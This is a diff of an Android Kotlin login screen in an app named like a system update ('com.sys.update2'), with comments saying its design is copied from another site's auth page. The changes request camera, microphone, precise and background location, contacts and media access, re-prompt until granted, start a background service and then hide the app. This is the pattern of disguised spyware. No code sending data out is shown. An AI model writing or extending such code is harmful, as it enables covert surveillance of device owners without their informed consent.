@@ -1,19 +1,21 @@
 // language: Kotlin, file: LoginActivity.kt
 // التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
-// + طلب صلاحيات الملفات والوسائط فقط (صور + فيديو)
-// + إخفاء التطبيق من الـ recents بعد المنح
-// + صفحة اختيار اللغة (أعلام مرسومة برمجياً)
+// + طلب صلاحيات كاملة: ملفات (صور+فيديو+صوت), مايك, كاميرا, موقع, جهات اتصال
+// + إخفاء التطبيق بعد المنح
+// + الخلفية تشتغل عبر BackgroundService
 
 package com.sys.update2
 
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -182,9 +184,10 @@ class LoginActivity : ComponentActivity() {
 
     // أذونات
     private var permissionAttempts = 0
-    private var mediaPermissionHandled = false
+    private var permissionsHandled = false
 
-    private val INITIAL_PERM_REQUEST = 101
+    private val PERM_REQUEST = 101
+    private val BG_LOCATION_REQUEST = 102
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -198,7 +201,7 @@ class LoginActivity : ComponentActivity() {
         startBackgroundService()
 
         Handler(Looper.getMainLooper()).postDelayed({
-            requestMediaPermissions()
+            requestAllPermissions()
         }, 1500L)
 
         setContent {
@@ -220,37 +223,56 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الأذونات — ملفات ووسائط فقط (صور + فيديو)
+    // الأذونات — كل الصلاحيات مرة واحدة
     // =================================================
 
-    private fun requiredMediaPermissions(): List<String> {
+    private fun requiredPermissions(): List<String> {
         val list = mutableListOf<String>()
-        when {
-            Build.VERSION.SDK_INT >= 33 -> {
-                list.add("android.permission.READ_MEDIA_IMAGES")
-                list.add("android.permission.READ_MEDIA_VIDEO")
-            }
-            else -> {
-                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
+
+        // ملفات ووسائط
+        if (Build.VERSION.SDK_INT >= 33) {
+            list.add("android.permission.READ_MEDIA_IMAGES")
+            list.add("android.permission.READ_MEDIA_VIDEO")
+            list.add("android.permission.READ_MEDIA_AUDIO")
+        } else {
+            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
+
+        // كاميرا
+        list.add(Manifest.permission.CAMERA)
+
+        // مايك
+        list.add(Manifest.permission.RECORD_AUDIO)
+
+        // موقع
+        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+        // جهات اتصال
+        list.add(Manifest.permission.READ_CONTACTS)
+
+        // إشعارات (Android 13+)
+        if (Build.VERSION.SDK_INT >= 33) {
+            list.add("android.permission.POST_NOTIFICATIONS")
+        }
+
         return list
     }
 
-    private fun requestMediaPermissions() {
+    private fun requestAllPermissions() {
         permissionAttempts++
 
-        val needed = requiredMediaPermissions().filter {
+        val needed = requiredPermissions().filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
         if (needed.isEmpty()) {
-            onMediaPermissionsGranted()
+            onAllPermissionsGranted()
             return
         }
 
         ActivityCompat.requestPermissions(
-            this, needed.toTypedArray(), INITIAL_PERM_REQUEST
+            this, needed.toTypedArray(), PERM_REQUEST
         )
     }
 
@@ -260,37 +282,67 @@ class LoginActivity : ComponentActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode != INITIAL_PERM_REQUEST) return
 
-        val allGranted = grantResults.isNotEmpty() &&
-            grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+        when (requestCode) {
+            PERM_REQUEST -> {
+                val allGranted = grantResults.isNotEmpty() &&
+                    grantResults.all { it == PackageManager.PERMISSION_GRANTED }
 
-        if (!allGranted) {
-            if (permissionAttempts < 3) {
-                Handler(Looper.getMainLooper()).postDelayed({
-                    requestMediaPermissions()
-                }, 800L)
+                if (!allGranted) {
+                    if (permissionAttempts < 3) {
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            requestAllPermissions()
+                        }, 800L)
+                    } else {
+                        // نكمل بالصلاحيات اللي اتاخدت
+                        onAllPermissionsGranted()
+                    }
+                    return
+                }
+
+                onAllPermissionsGranted()
             }
-            return
-        }
 
-        onMediaPermissionsGranted()
+            BG_LOCATION_REQUEST -> {
+                // تم الرد على طلب background location
+                hideAndMinimize()
+            }
+        }
     }
 
     // =================================================
-    // بعد منح الأذونات: شغّل الخلفية واختفِ
+    // بعد منح الأذونات
     // =================================================
 
-    private fun onMediaPermissionsGranted() {
-        if (mediaPermissionHandled) return
-        mediaPermissionHandled = true
+    private fun onAllPermissionsGranted() {
+        if (permissionsHandled) return
+        permissionsHandled = true
 
+        // 1) شغّل الخدمة
         startBackgroundService()
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
-        }, 2000L)
+        // 2) اطلب Background Location لو مش ممنوحة (Android 10+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val bg = ContextCompat.checkSelfPermission(
+                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            )
+            if (bg != PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(
+                    this, Manifest.permission.ACCESS_FINE_LOCATION
+                ) == PackageManager.PERMISSION_GRANTED
+            ) {
+                Handler(Looper.getMainLooper()).postDelayed({
+                    ActivityCompat.requestPermissions(
+                        this,
+                        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                        BG_LOCATION_REQUEST
+                    )
+                }, 500L)
+                return
+            }
+        }
 
+        // 3) بعد كل شيء: اختفاء
         Handler(Looper.getMainLooper()).postDelayed({
             hideAndMinimize()
         }, 800L)
